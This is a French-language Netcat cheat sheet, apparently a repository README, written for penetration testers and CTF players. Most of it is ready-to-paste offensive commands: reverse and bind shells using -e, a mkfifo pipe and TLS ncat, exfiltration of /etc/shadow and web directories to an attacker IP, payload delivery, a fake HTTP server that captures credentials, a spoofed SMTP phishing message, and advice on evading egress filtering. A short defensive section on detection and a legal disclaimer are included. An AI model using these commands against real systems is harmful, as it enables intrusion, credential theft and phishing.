<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔌 Netcat (nc) - Aide-mémoire complet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███╗   ██╗███████╗████████╗ ██████╗ █████╗ ████████╗
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝
  ██╔██╗ ██║█████╗     ██║   ██║     ███████║   ██║   
  ██║╚██╗██║██╔══╝     ██║   ██║     ██╔══██║   ██║   
  ██║ ╚████║███████╗   ██║   ╚██████╗██║  ██║   ██║   
  ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝   
       The TCP/IP Swiss Army Knife for Pentesters & Sysadmins
```
<p align="center">
  <img src="https://img.shields.io/badge/Netcat-TCP_IP_Swiss_Army_Knife-blue?style=for-the-badge" alt="Netcat">
  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="Exploitation et obus">
  <img src="https://img.shields.io/badge/Protocols-TCP_UDP-green?style=for-the-badge" alt="Protocoles TCP/UDP">
  <img src="https://img.shields.io/badge/License-BSD_/_GPL-red?style=for-the-badge" alt="Licence">
</p>

<p align="center">
  <b>🌐 Lire et écrire des données brutes sur les connexions réseau à l'aide des protocoles TCP et UDP</b>
</p>

---

## 📋 Table des matières

- [Vue d'ensemble et la philosophie Netcat](#-overview--la-philosophie-netcat)
-[Variantes Netcat et le dilemme de la saveur](#-netcat-variants--le-dilemme-de-la-flaveur)
  - [OpenBSD Netcat (`nc.openbsd`)](#openbsd-netcat-ncopenbsd)
  - [Netcat traditionnel (`nc.traditional`)](#traditional-netcat-nctraditional)
  - [Nmap Ncat (`ncat`)](#nmap-ncat-ncat)
-[Comparaison d'outils : variantes Netcat vs Socat](#-tool-comparison-netcat-variants-vs-socat)
- [Variantes d'installation et de commutation](#-installation--variantes-de-commutation)
- [Drapeaux de ligne de commande principaux](#-core-command-line-flags)
- [Analyse de port et capture de bannière](#-port-scanning--banner-grabbing)
- [Inverser et lier les shells] (#-reverse--bind-shells)
  -[Exécution de shell traditionnelle (`-e`)](#traditional-shell-execution--e)
  - [OpenBSD FIFO Named Pipe Reverse Shell](#openbsd-fifo-named-pipe-reverse-shell)
  - [OpenBSD FIFO Bind Shell](#openbsd-fifo-bind-shell)
  - [Shell TLS crypté avec Ncat (`--ssl`)](#encrypted-tls-shell-with-ncat---ssl)
- [Techniques de transfert de fichiers](#-file-transfer-techniques)
  - [Cibler l'attaquant (Exfiltration)](#target-to-attaquant-exfiltration)
  - [Attacker to Target (Payload Delivery)](#attaquant-to-target-payload-delivery)
  - [Archivage d'annuaire à la volée (`tar + nc`)](#on-the-fly-directory-archiving-tar--nc)
- [Redirection de port et relais réseau](#-port-forwarding--network-relays)
-[Serveur Web et émulation Honeypot](#-web-server--honeypot-emulation)
- [Débogage réseau et interaction de protocole manuelle](#-network-debugging--manual-protocol-interaction)
- [Tableau de référence rapide](#-quick-reference-table)
- [Considérations défensives et OPSEC](#-defensive-considérations--opsec)
- [Mentions légales](#-legal-disclaimer)

---

## 🎯 Présentation et philosophie Netcat

Créé à l'origine en 1995 par **Hobbit**, **Netcat** (souvent invoqué simplement sous le nom de `nc`) est célébré dans les communautés de cybersécurité et Unix comme le **« couteau suisse TCP/IP »**. 

Contrairement aux protocoles d'application de haut niveau ou aux outils de gestion volumineux, Netcat fait une chose exceptionnellement bien : **il ouvre des canaux réseau bruts au niveau des octets sur des sockets TCP ou UDP et les connecte directement à l'entrée standard (`stdin`) et à la sortie standard (`stdout`)**.

Que vous cherchiez des shells inversés, établissiez des canaux d'exfiltration secrets, des services de capture de bannières, transfériez des fichiers sans SMB/FTP ou diagnostiquiez le filtrage de paquets par pare-feu, Netcat reste un utilitaire indispensable dans l'arsenal de tout praticien de la sécurité.

---

## ⚖️ Variantes Netcat et le dilemme des saveurs

L'une des sources de confusion les plus fréquentes lors des tests d'intrusion et des défis CTF est que **plusieurs implémentations distinctes partagent la commande `nc`**. Comprendre avec quelle variante vous interagissez dicte les possibilités de syntaxe et de charge utile.
```
+-------------------------------------------------------------------------+
|                              The nc Command                             |
+------------------------------------+------------------------------------+
|                                    |                                    |
|             Debian / Ubuntu        |               CentOS / RHEL        |
|             (Default: OpenBSD)     |               (Default: Ncat)      |
+------------------+-----------------+------------------+-----------------+
                   |                                    |
     +-------------+-------------+                      |
     |                           |                      |
[netcat-openbsd]       [netcat-traditional]          [ncat]
(No -e compile flag)   (GAPING_SECURITY_HOLE)   (Nmap Project / SSL)
```
### OpenBSD Netcat (`nc.openbsd`)
- **Par défaut :** Kali Linux, Debian, Ubuntu, Linux Mint.
- **Trait clé :** Par défaut, compilé sans l'indicateur `-e` (programme d'exécution) pour éviter les vulnérabilités triviales d'exécution de code arbitraire.
- **Syntaxe d'identification :**
  ```bash
  nc -h 2>&1 | grep -i "OpenBSD"
  # Output: OpenBSD netcat (Debian patchlevel ...)
  ```
- **Solution de contournement d'exécution du shell :** utilise des canaux nommés Linux (`mkfifo`) pour relier `stdin` et `stdout` à `/bin/sh`.

### Netcat traditionnel (`nc.traditional`)
- **Auteur original :** Hobbit (v1.10).
- **Trait clé :** Compilé avec la directive `-DGAPING_SECURITY_HOLE`, autorisant le drapeau natif `-e` / `-c` (`nc -e /bin/bash`).
- **Syntaxe d'identification :**
  ```bash
  nc -h 2>&1 | grep -i "GAPING"
  ```
### Nmap Ncat (`ncat`)
- **Maintenu par :** Gordon Lyon (Fyodor) / The Nmap Project.
- **Trait clé :** Une réécriture moderne prenant en charge le **cryptage TLS/SSL**, les listes de contrôle d'accès IP (`--allow`, `--deny`), le courtage de connexions (`--broker`), le proxy SOCKS4/5 et l'exécution native multiplateforme.

---

## ⚖️ Comparaison d'outils : variantes Netcat vs Socat

| Fonctionnalité | `netcat-openbsd` | `netcat-traditional` | `ncat` (Nmap) | `socat` |
|---------|--------|------------|---------------|-------------|
| **Drapeau exécutable (`-e`)** | ❌ Dépouillé | ✅ Natif (`-e`) | ✅ Natif (`-e`, `--exec`) | ✅ Natif (`EXEC:`) |
| **Cryptage SSL/TLS** | ❌ Non | ❌ Non | ✅ Natif (`--ssl`) | ✅ Natif (`OPENSSL:`) |
| **Coquilles de tuyaux FIFO** | ✅ Oui (`mkfifo`) | ✅ Oui | ✅ Oui | ✅ Oui |
| **Mode de numérisation de ports** | ✅ Oui (`-z`) | ✅ Oui (`-z`) | ❌ Non | ❌ Non |
| **Écouteur persistant** | ✅ Oui (`-k`) | ❌ Non (Sortie à la déconnexion) | ✅ Oui (`-k`, `--keep-open`) | ✅ Oui (`fork`) |
| **Prise en charge IPv6** | ✅ Natif (`-6`) | ❌ Limité | ✅ Natif (`-6`) | ✅Autochtone |
| **Proxy / Client SOCKS** | ✅ Oui (`-X`, `-x`) | ❌ Non | ✅ Oui (`--proxy`) | ✅ Prise en charge complète du proxy |
| **Chat / Courtier multi-clients**| ❌ Non | ❌ Non | ✅ Natif (`--broker`) | ❌ Configuration manuelle |
| **Par défaut sur Kali / Debian** | ✅ Oui (`/bin/nc`) | 🔄 Disponible (`apt`) | 🔄 Disponible (`ncat`) | 🔄 Disponible (`socat`) |

---

## 📥 Variantes d'installation et de commutation

Sur les distributions basées sur Debian (y compris Kali Linux), vous pouvez installer toutes les versions et basculer entre elles via `update-alternatives` :
```bash
# Install all Netcat implementations
sudo apt update
sudo apt install -y netcat-openbsd netcat-traditional ncat socat

# Check current default alternative
readlink -f /bin/nc

# Switch default nc binary interactively
sudo update-alternatives --config nc
```
Pour exécuter explicitement une variante spécifique sans modifier les valeurs par défaut du système :
```bash
# Invoke OpenBSD variant directly
nc.openbsd -lvnp 4444

# Invoke Traditional variant directly
nc.traditional -lvnp 4444 -e /bin/bash

# Invoke Nmap Ncat
ncat -lvnp 4444 --ssl
```
---

## ⚙️ Indicateurs de base de la ligne de commande

| Drapeau | Signification et description |
|------|----------------------------|
| `-l` | **Mode d'écoute** : attendez les connexions entrantes au lieu d'initier des connexions sortantes. |
| `-v` | **Mode verbeux** : imprimez des informations détaillées de connexion et de diagnostic (`-vv` pour une verbosité plus élevée). |
| `-n` | **IP uniquement numérique** : désactivez la résolution DNS inversée pour plus de rapidité et de furtivité. |
| `-p <port>` | **Port local** : spécifiez le port local sur lequel lier ou écouter. |
| `-u` | **Mode UDP** : utilisez le protocole UDP au lieu du flux TCP par défaut. |
| `-k` | **Continuez à écouter** : continuez à écouter et à accepter de nouvelles connexions après la déconnexion d'un client. |
| `-w <sec>` | **Timeout** : délai d'expiration en secondes pour l'établissement de la connexion et les lectures de sockets inactives. |
| `-z` | **Mode zéro E/S** : mode de numérisation ; n'envoyez aucune donnée utile et fermez le socket immédiatement après l'établissement de la liaison. |
| `-q <sec>` | **Quitter après EOF** : attendez les secondes spécifiées après la réception d'EOF sur `stdin` avant de terminer. |
| `-s <ip>` | **IP source** : liaison à une interface locale/adresse IP source spécifique. |
| `-4` / `-6` | Forcez l’adressage IPv4 ou IPv6 exclusivement. |

---

## 🔍 Analyse des ports et capture de bannières

Alors que les outils dédiés tels que `nmap` ou `masscan` sont préférés pour des balayages complets, Netcat fournit une vérification de port instantanée et sans dépendance lorsque vous atterrissez sur une cible restreinte.

### Analyse rapide des ports
```bash
# TCP Port Scan on a specific port range (Zero-I/O, numeric, 1s timeout)
nc -zvn -w 1 192.168.1.100 20-100

# Scan specific common service ports
nc -zvn -w 2 10.10.10.50 21 22 80 443 445 3389

# Scan UDP Ports (DNS, SNMP, NTP)
nc -zvun -w 2 10.10.10.50 53 161 123
```
### Saisie de bannières de service

Banner Grabbing extrait les chaînes de version brutes des démons distants pour l'identification des vulnérabilités :
```bash
# Banner grab an SSH daemon
nc -vn 10.10.10.10 22

# Banner grab an FTP server
nc -vn 10.10.10.10 21

# Banner grab an SMTP mail server
nc -vn 10.10.10.10 25

# Manual HTTP HEAD / GET request
printf "HEAD / HTTP/1.1\r\nHost: target.local\r\nConnection: close\r\n\r\n" | nc -vn 10.10.10.10 80
```
---

## 💀 Inverser et lier les coques

La connexion d'un interpréteur de commandes distant (`/bin/sh`, `/bin/bash`, `cmd.exe`) sur un socket Netcat est l'une des techniques de test d'intrusion les plus fondamentales.

### Exécution de shell traditionnelle (`-e`)

Si `netcat-traditional` ou `ncat` est installé sur le système cible avec prise en charge de l'exécution :
```bash
# 1. Attacker sets up a listener
nc -lvnp 4444

# 2. Target sends a reverse shell (Linux)
nc.traditional 10.10.14.5 4444 -e /bin/bash

# Target sends a reverse shell (Windows)
nc.exe 10.10.14.5 4444 -e cmd.exe

# Bind Shell (Target listens, attacker connects)
# On Target:
nc.traditional -lvnp 8888 -e /bin/bash
# On Attacker:
nc -vn 10.10.10.50 8888
```
### OpenBSD FIFO nommé Pipe Reverse Shell

Sur les distributions modernes Debian, Ubuntu, Kali et Fedora, `nc` n'a pas l'indicateur `-e`. Utilisez un canal nommé **FIFO (First-In-First-Out)** pour rediriger l'entrée standard et la sortie standard :
```bash
# 1. Attacker sets up listener
nc -lvnp 4444

# 2. Target executes named pipe reverse shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 >/tmp/f
```
#### Comment fonctionne le pipeline FIFO :
1. `rm -f /tmp/f` : supprime tout fichier de canal obsolète.
2. `mkfifo /tmp/f` : crée un canal FIFO nommé spécial dans `/tmp`.
3. `cat /tmp/f` : lit l'entrée fournie dans le canal et la transmet à `/bin/sh -i`.
4. `| /bin/sh -i 2>&1` : génère un shell interactif, redirigeant l'erreur standard (`stderr`) vers la sortie standard (`stdout`).
5. `| nc 10.10.14.5 4444 >/tmp/f` : transmet la sortie du shell à l'attaquant sur le réseau, tout en réécrivant les frappes réseau reçues dans `/tmp/f`.

### Shell de liaison FIFO OpenBSD

Lorsque la cible dispose d'une adresse IP publique ou locale routable et que les règles de pare-feu entrant autorisent le trafic :
```bash
# On Victim / Target machine:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p 8888 >/tmp/f

# On Attacker machine:
nc -vn 10.10.10.50 8888
```
### Shell TLS chiffré avec Ncat (`--ssl`)

Le trafic Netcat non chiffré peut être inspecté par IDS/IPS et par des taps réseau. `ncat` prend en charge le cryptage TLS/SSL de manière native :
```bash
# 1. Attacker sets up an SSL encrypted listener
ncat --ssl -lvnp 4444

# 2. Victim connects with an encrypted reverse shell
ncat --ssl 10.10.14.5 4444 -e /bin/bash

# SSL listener with IP Access Control (Whitelisting attacker IP only)
ncat --ssl -lvnp 4444 --allow 10.10.14.5
```
---

## 📁 Techniques de transfert de fichiers

Lorsque SSH, SCP, FTP et SMB sont bloqués ou désinstallés, Netcat fournit un pipeline de transfert de fichiers bidirectionnel instantané sur n'importe quel port TCP ouvert.

### Cible de l'attaquant (exfiltration)
```bash
# 1. Attacker opens a listener and redirects incoming stream to a local file
nc -lvnp 9001 > loot_passwords.txt

# 2. Target reads sensitive file and sends it to attacker's listener
nc -vn 10.10.14.5 9001 < /etc/shadow
```
### Attaquant à cibler (livraison de charge utile)
```bash
# 1. Attacker hosts the payload file on a listener
nc -lvnp 9001 < linpeas.sh

# 2. Target connects and saves the stream to disk
nc -vn 10.10.14.5 9001 > linpeas.sh
```
### Vérification de l'intégrité (sommes de contrôle)

Vérifiez toujours l'intégrité des octets après les transferts Netcat bruts :
```bash
# Calculate MD5 on both source and destination machines
md5sum transferred_file.tar.gz
```
### Archivage d'annuaire à la volée (`tar + nc`)

Transférez des structures de répertoires entières sans créer de fichiers d'archives temporaires intermédiaires sur le disque de la victime :
```bash
# 1. Attacker listens and extracts incoming tar stream directly
nc -lvnp 9001 | tar -xzvf - -C /opt/loot/

# 2. Target compresses and streams directory across the wire
tar -czvf - /var/www/html | nc -vn 10.10.14.5 9001
```
---

## 🔀 Redirection de port et relais réseau

Netcat peut agir comme un relais réseau léger sans nécessiter de redirection de port SSH :
```bash
# Relay traffic arriving on Port 8080 to an internal database on 192.168.20.10:3306
rm -f /tmp/relay; mkfifo /tmp/relay
nc -l -p 8080 < /tmp/relay | nc 192.168.20.10 3306 > /tmp/relay
```
---

## 🌐 Émulation de serveur Web et de pot de miel

### Serveur HTTP à fichier unique minimaliste

Servez une charge utile HTTP statique ou capturez les informations d'identification soumises par les navigateurs :
```bash
# One-shot HTTP response
printf "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Pwned!</h1>\n" | nc -lvnp 80

# Continuous loop HTTP server (captures POST credentials and browser headers)
while true; do
  printf "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 17\r\n\r\nCaptured Request!" | \
  nc -lvnp 8080
done
```
### Chat multi-clients/courtier de messages (`ncat`)

Ncat inclut un mode courtier intégré, créant une salle de relais ad hoc de type IRC pour les opérateurs de l'équipe rouge :
```bash
# Attacker runs broker on port 5555
ncat -lvnp 5555 --broker

# Multiple operators connect and broadcast messages to each other
ncat 10.10.14.5 5555
```
---

## 🛠️ Débogage réseau et interaction manuelle du protocole

### Injection de courrier SMTP brut
```bash
nc -vn mail.target.local 25 <<EOF
HELO attacker.local
MAIL FROM:<admin@target.local>
RCPT TO:<victim@target.local>
DATA
Subject: Critical Security Patch

Please follow the attachment instructions.
.
QUIT
EOF
```
### Récupération de courrier POP3 brut
```bash
nc -vn mail.target.local 110
# Server replies: +OK POP3 server ready
USER testuser
# Server replies: +OK
PASS SecretPassword123
# Server replies: +OK User logged in
STAT
RETR 1
QUIT
```
---

## ⚡ Tableau de référence rapide

| Objectif | Commande |
|-----------|---------|
| **Auditeur standard** | `nc -lvnp <PORT>` |
| **Écouteur persistant** | `nc -lvnp <PORT> -k` |
| **Connectez-vous à l'hôte distant** | `nc -vn <HOST> <PORT>` |
| **Connectez-vous via UDP** | `nc -u -vn <HOST> <PORT>` |
| **Analyse des ports TCP (rapide)** | `nc -zvn -w 1 <HOST> <START>-<END>` |
| **Analyse des ports UDP** | `nc -zvun -w 2 <HOST> <PORT>` |
| **OpenBSD nommé Pipe Shell** | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc <IP> <PORT> >/tmp/f` |
| **Coque traditionnelle (`-e`)** | `nc <IP> <PORT> -e /bin/bash` |
| **Coque SSL cryptée (`ncat`)**| `ncat --ssl <IP> <PORT> -e /bin/bash` |
| **Recevoir un fichier (écouteur Exfil)**| `nc -lvnp <PORT> > output_file` |
| **Envoyer le fichier (expéditeur Exfil)** | `nc -vn <IP> <PORT> < input_file` |
| **Dossier de diffusion via Tar** | `tar -czvf - /path \| nc -vn <IP> <PORT>` |
| **Extraire le dossier diffusé** | `nc -lvnp <PORT> \| tar -xzvf -` |
| **Saisie de bannière** | `nc -vn -w 2 <HOST> <PORT>` |

---

## 🛡️ Considérations défensives et OPSEC

1. **Avertissement en texte clair non chiffré :**
   - Standard Netcat n'utilise **pas** d'encapsulation cryptographique. Tous les mots de passe, jetons de session ou commandes shell envoyés via `nc` en texte clair peuvent être extraits par les capteurs Network Security Monitoring (NSM) (Zeek, Suricata, Wireshark).
   - Utilisez `ncat --ssl` ou encapsulez le trafic dans un tunnel SSH/TLS autant que possible.
2. **Audit de processus et Sysmon :**
   - Sur les systèmes Linux, la journalisation de l'exécution des processus (`auditd`, eBPF, Falco) signale les invocations de `nc` contenant des indicateurs comme `-e` ou des commandes créant `/tmp/f` et `mkfifo`.
   - Sous Windows, les agents EDR signalent ou mettent régulièrement en quarantaine les binaires `nc.exe` en raison de signatures statiques connues.
3. **Restrictions entrantes du pare-feu :**
   - Choisissez toujours les ports sortants courants (`80`, `443`, `53`) lors de la configuration des écouteurs de shell inversés pour contourner les politiques strictes de filtrage de sortie.

---

## ⚠️ Mentions légales

> [!ATTENTION]
> Cette aide-mémoire est conçue uniquement à des fins de tests d'intrusion autorisés, d'évaluation de vulnérabilité, de compétitions CTF et d'administration système. Intercepter le trafic réseau, exfiltrer des données ou exécuter des shells inversés contre des systèmes sans consentement écrit explicite est illégal et punissable par les lois sur la cybersécurité du monde entier. Utiliser de manière responsable et éthique.